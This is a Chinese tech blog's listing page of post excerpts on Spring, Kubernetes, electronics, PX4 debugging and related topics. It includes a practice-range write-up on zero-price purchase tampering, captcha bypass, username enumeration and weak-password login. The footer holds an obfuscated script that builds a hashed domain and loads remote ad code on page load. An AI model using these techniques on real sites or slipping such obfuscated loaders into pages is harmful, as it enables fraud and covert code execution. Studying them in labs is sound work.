		对Spring框架的一些总结 在文章开头我真心推荐大家一个优秀的编程老师：孙帅老师(孙哥suns)，孙帅老师在哔哩哔哩的Spring5教学视频时长接近33个小时，从0基础到一步一步手把手的教你抽丝剥茧分析Spring框架的所有知识，孙帅老师的教学风格非常适合那些“底子薄”和“零基础”的同学，只要你不走神跟着孙老师的节奏走，5天就可以彻底拿下Spring框架！ 送上学习链接： https://www.bilibili.com/video/BV185411477k/?vd_source=9786a35af61955803a914a173d17e3d9 最近我们在组建一个学习兴趣小组，如果您也是Java开发的程序员，不管是刚刚入行的小兄弟还是和工作几年的老兵都可以加入我们~ 😉😉 学习兴趣小组： ✅✅1：我们免费分享【高质量】Netty、Dubbo、k8s、Mybatis、Spring...应用和源码级别的视频资料！《开源的学习资料已经烂大街了，哔哩哔哩到处都是，但是真真正正的高质量的能够让你听懂学会的少之又少，我们的兴趣小组就是一群“过来人”总结和整理的一些【高质量】学习资料，供大家食用，少踩坑少走弯路就节约了很多时间精力，就可以早点拿高薪呀~》 ✨✨2：我们一群小伙伴一起互相鼓励，互相督促，每天知识星球打卡学习，水滴石穿天天充电才能不被社会淘汰~ 快来加入我们吧~ 🥭🥭3：【高质量】学习资料，加QQ号 “2677242270” 免费领取呦~ 💞💞 开胃小菜~ **Spring设计目标：**Spring为开发者提供一个一站式轻量级应用开发平台；
**Spring设计理念：**在javaEE开发中，支持Pojo和javaBean开发方式，使应用面向接口开发，充分支持OOP(面向对象)设计方法，Spring通过IOC容器实现对象耦合关系的管理，并实现依赖反转，将对象之间的依赖关系交给IOC容器，实现解耦;
Spring框架的核心: IOC容器和AOP模块。通过IOC容器管理Pojo对象以及他们之间的耦合关系;通过AOP以动态代理非侵入的方式增强服务。IOC让相互协作的组件保持松散的耦合，而AOP编程允许你把遍布于应用各层的功能分离出来形成可重用的功能组件。
问答集~ 问题：Spring的优缺点是什么? 优点 方便解耦，简化开发
Spring就是一个大工厂，可以将所有对象的创建和依赖关系的维护，交给Spring管理
AOP编程的支持
Spring提供面向切面编程，可以方便的实现对程序进行权限拦截、运行监控等功能。
声明式事务的支持
只需要通过配置就可以完成对事务的管理，而无需手动编程
方便程序的测试
Spring对junit4支持，可以通过注解方便的测试Spring程序
方便集成各种优秀框架
​ Spring不排斥各种优秀的开源框架，其内部提供了对各种优秀框架的直接支持
​ (如: SpringMVC、MyBatis等)
缺点 Spring依赖反射，反射影响性能学习成本较高，很多人对IOC和AOP都没办法很好的理解 问题：Spring价值有哪些？ spring是非侵入式的框架，目标是使应用程序代码对框架依赖最小化；Spring提供一个一致的编程模型，使应用直接使用POJO开发，与运行环境隔离开来；Spring推动应用设计风格向面向对象和面向接口开发转变，提高了代码的重用性和可测试性 问题：Spring 框架中都用到了哪些设计模式? 工厂模式: BeanFactory就是简单工厂模式的体现，用来创建对象的实例;单例模式: Bean默认为单例模式。代理模式: Spring的AOP功能用到了JDK的动态代理和CGLIB字节码生成技术，模板方法: 用来解决代码重复的问题。比如.RestTemplate,JmsTemplate,JpaTemplate。观察者模式: ApplicationContext事件机制是观察者设计模式的实现，通过 ApplicationEvent类和 ApplicationListener 接口，可以实现 ApplicationContext事件处理。如果容器中有一个 ApplicationListener Bean ，每当 ApplicationContext 发布 ApplicationEvent 时，ApplicationListener Bean 将自动被触发。这种事件机制都必须需要程序显示的触发。其中spring有一些内置的事件，当完成某种操作时会发出某些事件动作。比如监听 ContextRefreshedEvent事件，当所有的bean都初始化完成并被成功装载后会触发该事件，实现 ApplicationListener接口可以收到监听动作，然后可以写自己的逻辑。同样事件可以自定义、监听也可以自定义，完全根据自己的业务逻辑来处理。 核心知识~ IOC的理解 一： IOC的概念与原理
IOC，即控制反转，把对象的创建、初始化、销毁交给 Spring 来管理，而不是由开发者控制，实现控制反转。IOC 思想基于 IOC 容器完成，IOC 容器底层就是对象工厂（BeanFactory 接口）。IOC的原理是基于xml解析、工厂设计模式、反射实现的。使用IOC可以降低代码的耦合度。 二：Spring 提供 IOC 容器实现两种方式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de89e3d37331e5581910d4c2e8662bfc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feb805a8eb1a4386e91d9f1c7e73d052/" rel="bookmark">
			关于Typora如何插入自己的云端视频的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于Typora如何插入自己的云端视频的方法 文章目录 关于Typora如何插入自己的云端视频的方法前言：实现步骤：小结 前言： 我本来使用gitee来作为typora的图床，但我现在想要把我自己的视频上传到云端，然后通过超链接在typora中能够实时预览。
关于网站视频、本地视频的插入，Typora中文官网有详细的教程：嵌入视频、媒体或网络内容 | TyporaChina
而官方并没有提到如何让自己的云端视频能够在Typora中显示。
我根据这篇博文：GitHub 仓库的 README 直接播放视频_github readme 视频-CSDN博客的相关内容实现了如何将自己的视频上传到云端后，在typora中显示出来。
实现步骤： 首先准备一个github仓库，什么仓库都可以（gitee仓库经测试不可以）在该仓库的 issue中新建一个 issue 在write中将你的视频拖进去 但是只能上传10MB以内的视频文件
上传完成后，会显示一个 网址链接一样的东西，然后提交该评论 提交后可以发现，已经可以在github下的issue中预览了。（以上步骤文章开头部分的博客链接中也都有所涉及） 接下来，打开B站，随便找到一个视频，点击 分享，点击 嵌入代码。 这是我复制的嵌入代码：
&lt;iframe src="//player.bilibili.com/player.html?aid=546403908&amp;bvid=BV1hq4y1s7VH&amp;cid=361820022&amp;p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"&gt; &lt;/iframe&gt; 将上述代码中的网址部分换成之前github上的那个网址链接，如果你刚刚没有复制，可以右击那个视频，点击 复制链接。 如果正常的话，你的云端视频就可以在Typora上播放了 （视频大一点的话可以需要加载一会） 小结 本文主要是利用github的issue结合Typora播放网页视频的功能实现自己的云端视频的在线预览。经测试，几秒以内的视频显示良好，时间长的视频加载时间较长。总的来说，如果非必要可以直接使用动图的加载，这在我之前的文章中有所涉及，这里不再赘述。
时间长的视频加载时间较长。总的来说，如果非必要可以直接使用动图的加载，这在我之前的文章中有所涉及，这里不再赘述。
如果您觉得我写的不错，麻烦给我一个免费的赞！如果内容中有错误，也欢迎向我反馈。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74b520fa56b97b6eb66fcae5a2da15c2/" rel="bookmark">
			电子元器件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、电阻器1.1 电阻简介1.2 电阻的功能1.3 如何选择电阻 二、电容器2.1 电容简介2.2 电容的作用2.3 电容选型 三、电感器3.1 电感简介3.2 电感功能 四、二极管4.1 二极管的认识4.2 二极管参数与特性4.3 二极管分类与应用 五、三极管5.1 三极管简介5.2 三极管的功能与应用 六、MOS管6.1 MOS管简介6.2 MOS管应用 七、其他元器件7.1 运放7.2 电源器件7.2.1 电源转换器件7.2.2 基准电压源 7.3 晶振7.4 继电器7.5 光耦7.6 保险丝（熔断器）7.7 变压器7.8 IGBT 前言 本篇只介绍低功率元器件，电源等大功率元器件不做介绍。此外本文重点是电子元器件的作用，至于元器件怎么做出来的不做过多介绍，感兴趣可以自行百度。其他的话，座子和开关也不做介绍了，毕竟这东西也没啥好介绍的
一、电阻器 1.1 电阻简介 电阻的认识
电阻本质上就是将电能转化为内能并释放出去的电子元件，其在电路中对电流有阻碍作用，市面上有各种各样类型的电阻，如下图所示：
如果按功能进行分类的话，电阻大概可以分为以下三类：
最后，电阻在原理图可以用下面符号表示：
电阻参数 阻值的介绍
我们都知道电阻的计算公式为：R=U/I（单位为欧姆Ω）。在PCB板上最常见的是贴片电阻，而阻值是电阻器最重要的参数，下面我们以贴片电阻做简单的阻值计算介绍（具体电阻阻值计算方法可以自行百度）：
如上图所示，103的阻值为10×10^3=10kΩ，5R60的阻值为5.6Ω。一般情况下可以使用万用表测量阻值，需要注意电阻串并联方式。封装：贴片电阻常用封装大小有0603（表示长0.6英寸，宽0.3英寸，封装基板尺寸为1.6mm x 0.8mm）、0805等等精度：表示实际值与标称值的最大误差，有1%、5%等 1.2 电阻的功能 分压、限流
以下图为例，很明显V1对VCC进行了分压，并且R1、R2对LED起限流保护作用
温湿度或者气压等测量
这边以可变电阻为例，如热敏电阻，当环境温度改变时，阻值会发生变化，根据温度曲线从而可以计算出实际温度
防浪涌
如下面电路，添加压敏电阻，当外界电压很大时，压敏电阻阻值比较小，这样就形成短路起到保护电路的作用
1.3 如何选择电阻 我们在进行电阻选型的时候，主要对其功能和参数进行考量。
在功能上，比如我们需要速度调节，此时选择可变电阻。在PCB板上固定电阻，我们可以选择贴片电阻
在参数上，我们主要对阻值、精度（采样电阻精度要求高点）、功率（同阻值一般封装大的电阻功率会大点）和电压（电压过大电阻可能烧毁）进行选择。
二、电容器 2.1 电容简介 电容的认识
电容器通俗来讲就是可以容纳电荷量的器件，因此与电阻这种耗能元件不同，电容是一个储能元件，电容的种类有很多，如下图所示，不过常用在PCB板上的就是电解电容与贴片电容
电容在PCB原理图常用以下标识来表示：
基本参数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74b520fa56b97b6eb66fcae5a2da15c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a6e80ed57792e9913604f9d8eb06bdb/" rel="bookmark">
			ubuntu PX4 vscode stlink debug设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		硬件 stlink
holybro debug板
pixhawk4
安装openocd 官方文档，但是第一步安装建议从源码安装，bug少很多
github链接
编译安装，参考
./bootstrap (when building from the git repository) ./configure [options] make sudo make install 安装后在usr/local/bin下面有一个openocd
px4qgc@ubuntu:~$ which openocd /usr/local/bin/openocd 另外要注意gcc-arm路径
px4qgc@ubuntu:~$ which arm-none-eabi-gdb /opt/gcc-arm-none-eabi-9-2020-q2-update/bin/arm-none-eabi-gdb 然后进行一点测试，看看环境对不对再往下走
比如我用fmuv5的pixhawk4：
openocd -f interface/stlink.cfg -f target/stm32f7x.cfg arm-none-eabi-gdb build/px4_fmu-v5_default/px4_fmu-v5_default.elf -ex "target extended-remote :3333" 可能的报错：
arm-none-eabi-gdb: error while loading shared libraries: libncurses.so.5: cannot open shared object file: No such file or directory 安装对应的库即可
sudo apt-get update sudo apt-get install libncurses5 usb设备权限问题
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a6e80ed57792e9913604f9d8eb06bdb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0646208320979dc685cc9ca127af83c7/" rel="bookmark">
			2.5 逆矩阵
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、逆矩阵的注释 假设 A A A 是一个方阵，其逆矩阵 A − 1 A^{-1} A−1 与它的大小相同， A − 1 A = I A^{-1}A=I A−1A=I。 A A A 与 A − 1 A^{-1} A−1 会做相反的事情。它们的乘积是单位矩阵 —— 对向量无影响，所以 A − 1 A x = x A^{-1}A\boldsymbol x=\boldsymbol x A−1Ax=x，但是 A − 1 A^{-1} A−1 也可能不存在。
矩阵最常见的就是乘一个向量 x \boldsymbol x x， A x = b A\boldsymbol x =\boldsymbol b Ax=b 两边同时乘 A − 1 A^{-1} A−1 得到 A − 1 A x = A − 1 b A^{-1}A\boldsymbol x=A^{-1}\boldsymbol b A−1Ax=A−1b，所以 x = A − 1 b \boldsymbol x=A^{-1}\boldsymbol b x=A−1b。 A − 1 A A^{-1}A A−1A 的乘积就像一个乘一个数再除一个数。如果一个数非零，则必然存在倒数，矩阵会更复杂一些。 A − 1 A^{-1} A−1 称为 A A A 的逆矩阵。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0646208320979dc685cc9ca127af83c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b0f36c4d16d7cbe775e9b78a75d5d9a/" rel="bookmark">
			QGIS校正哨兵-1 GRD产品
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用到了gdalwarp、gdaltranslate两个工具。
1 打开qgis软件 2 Raster-&gt;Projections-&gt;Warp(reproject)… 3 输入待校正GRD影像 4 处理日志 5 处理结果拉伸显示 6 裁剪视图范围 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8fb990fd1d226b9f484370da5435dc61/" rel="bookmark">
			持续集成部署-k8s-高级调度-污点和容忍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		持续集成部署-k8s-高级调度-污点和容忍 1. 基本概念2. 使用场景3. 污点的基本操作1. 添加污点2. 查看污点3. 删除污点4. 污点的影响：5. 配置容忍6. 删除容忍7. 测试添加污点 4. 容忍的配置 1. 基本概念 在Kubernetes中，污点是一种属性，它可以被赋予Node（节点），用于标记该节点上的Pod应该避免调度的特定条件，例如特定的硬件限制、安全策略等。而容忍则是Pod的一个属性，它允许Pod在特定的污点条件下仍然被调度到对应的节点上。
k8s 集群中可能管理着非常庞大的服务器，这些服务器可能是各种各样不同类型的，比如机房、地理位置、配置等，有些是计算型节点，有些是存储型节点，此时我们希望能更好的将 pod 调度到与之需求更匹配的节点上。
此时就需要用到污点（Taint）和容忍（Toleration），这些配置都是 key: value 类型的。
比如我们拿一个三节点的 K8s 集群来说：
Master 节点一般是用来调度从节点实现对应的任务，是更重要的角色，而从节点是用来执行对应的任务的。当创建一个新的任务，无论是 Pod 还是 Deployment 都会先找没有存在污点的节点上执行。
污点还可以理解为，为了将未分配的任务排挤到没有污点的节点上运行。
而容忍，就是反过来的概念，你有污点，我这个任务配置了容忍，也就是可以容忍你有污点，这时候我这个任务还是可以调度到这个节点上的。
2. 使用场景 硬件特性限制：当某些节点具有特定的硬件特性（如GPU、TPU等）时，可以给这些节点打上对应的污点，然后只有带有对应容忍标记的Pod才会被调度到这些节点上，从而保证Pod能够充分利用这些硬件资源。
避免节点负载过高：当节点负载过高时，可以给这些节点打上污点，防止新的Pod被调度到这些节点上，以避免进一步加重节点负载。
安全策略：通过污点和容忍，可以实现对部分节点进行安全隔离，例如将某些特殊的安全策略应用到特定的节点上，以满足安全合规性要求。
节点维护：在节点需要维护时，可以先将节点打上污点，然后逐步驱逐上面的Pod，以确保维护操作不会影响到正在运行的应用程序。
总之，污点和容忍功能为Kubernetes集群的高级调度提供了灵活性和精细化的控制，可以根据实际需求对Pod的调度行为进行定制，使得整个集群能够更好地适应复杂的业务场景和运维需求。
3. 污点的基本操作 1. 添加污点 要向节点添加污点，可以使用kubectl命令行工具执行以下命令：
kubectl taint nodes &lt;node-name&gt; key=value:taint-effect 其中：
&lt;node-name&gt; 是要添加污点的节点名称。key=value 是污点的键值对，可以根据实际情况定义不同的键值对，例如gpu=true。taint-effect 指定了污点的效果，包括： NoSchedule：表示新的Pod将不会被调度到带有此污点的节点上。NoExecute：表示已经存在的Pod如果不满足对应的容忍条件，则将被驱逐出该节点。 例如，要向名为node1的节点添加一个gpu=true:NoSchedule的污点，可以执行以下命令：
kubectl taint nodes node1 gpu=true:NoSchedule 2. 查看污点 kubectl describe no k8s-master 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8fb990fd1d226b9f484370da5435dc61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d554d4998dd3d613cdff0d26e7d67895/" rel="bookmark">
			业务逻辑漏洞复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		业务逻辑漏洞复现 文章目录 业务逻辑漏洞复现零元购验证码绕过网页绕过(前端)服务器绕过(后端)用户名遍历弱口令登录 零元购 登录账户，然后随机点击一个物品
开启bp抓包
这里抓到了数量和金额，我们进行修改放包
这里就可以发现数量变成了99，金额为0，将付款方式设置为站内付款，然后提交就可以了
验证码绕过 来到pikachu靶场
网页绕过(前端) bp抓包，先老老实实输一遍验证码
可以发现我们刚刚输入的内容都在，如果验证码正确的话会显示username or password is not exists!，如果说我们将验证码删掉会再重新发包会发生什么呢
居然也是可以通过的，说明前端的验证码可以通过抓包删除的方式绕过
服务器绕过(后端) 和前端绕过一样，抓包
这里显示登录成功，去bp查看一下
bp里面却没有显示代表成功的语句，我们将验证码改为新出现的
这样就出现了，我们只要不刷新页面就可以进行账户密码的爆破，这个的原理就是因为验证码是由前端生成的，服务器需要去前端验证，只要前端页面不发生改变，验证码便有效
用户名遍历 随便输入一个账户密码，然后登录，就会发现他提示该用户不存在，根据此方法可以进行用户名遍历
弱口令登录 使用弱口令admin尝试登录
直接就登录成功了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/683abfbe72e0d4c03b418956f9bc5b08/" rel="bookmark">
			我的2023年12月02日对文章发送的一个测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Markdown.com.cn 简介 支持自定义样式的 Markdown 编辑器支持微信公众号、知乎和稀土掘金点击右上方对应图标，一键复制到各平台 2 Markdown语法教程 2.1 标题 不同数量的#可以完成不同的标题，如下：
一级标题 二级标题 三级标题 2.2 字体 粗体、斜体、粗体和斜体，删除线，需要在文字前后加不同的标记符号。如下：
这个是粗体
这个是斜体
这个是粗体加斜体
这里想用删除线
注：如果想给字体换颜色、字体或者居中显示，需要使用内嵌HTML来实现。
本文由博客一文多发平台 OpenWrite 发布！
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/49/">«</a>
	<span class="pagination__item pagination__item--current">50/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/51/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>